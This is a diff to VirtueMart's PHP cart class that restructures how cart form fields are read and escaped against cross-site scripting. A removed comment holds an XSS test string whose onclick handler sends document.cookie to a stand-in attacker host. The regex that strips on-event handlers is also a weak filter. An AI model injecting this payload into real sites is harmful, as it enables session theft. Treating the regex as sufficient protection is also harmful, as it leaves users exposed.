@@ -1198,37 +1198,24 @@ class VirtueMartCart {
 			, array('delimiters' => true, 'captcha' => true, 'system' => false)
 			, array('delimiter_userinfo', 'name','username', 'password', 'password2', 'address_type_name', 'address_type', 'user_is_vendor', 'agreed'));
 
-		if(!class_exists('vmFilter'))require(VMPATH_ADMIN.DS.'helpers'.DS.'vmfilter.php');
 		foreach ($cartFields as $fld) {
 			if(!empty($fld->name)){
 				$name = $fld->name;
-				if(!isset($data[$name])){
 
-					if($fld->type=='checkbox'){
-						$tmp = vRequest::getInt($name,false);
-						if($tmp){
-							$data[$name] = $tmp;
-						}
-					} else {
-						$tmp = vRequest::getString($name,false);
-						if($tmp){
-							$data[$name] = $tmp;
-						}
-					}
+				if($fld->type=='checkbox'){
+					$tmp = vRequest::getInt($name,false);
 
+				} else {
+					$tmp = vRequest::getString($name,false);
 				}
 
-				//Lets filter it, test string
-	//öäü?ß<script>alert("attacked")</script> <a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>
-				if(isset($data[$name])){
-					if(!empty($data[$name])){
-						$data[$name] = htmlspecialchars ($data[$name],ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8',false);
-						$data[$name] = (string)preg_replace('#on[a-z](.+?)\)#si','',$data[$name]);//replace start of script onclick() onload()...
-					}
-
-					$this->cartfields[$name] = $data[$name];
-					vmdebug('Store $this->cartfields[$name] '.$name.' '.$data[$name]);
+				if(!empty($tmp)){
+					$tmp = htmlspecialchars ($tmp,ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8',false);
+					$tmp = (string)preg_replace('#on[a-z](.+?)\)#si','',$tmp);//replace start of script onclick() onload()...
 				}
+
+				$this->cartfields[$name] = $tmp;
+				vmdebug('Store $this->cartfields[$name] '.$name.' '.$tmp);
 			}
 		}
 
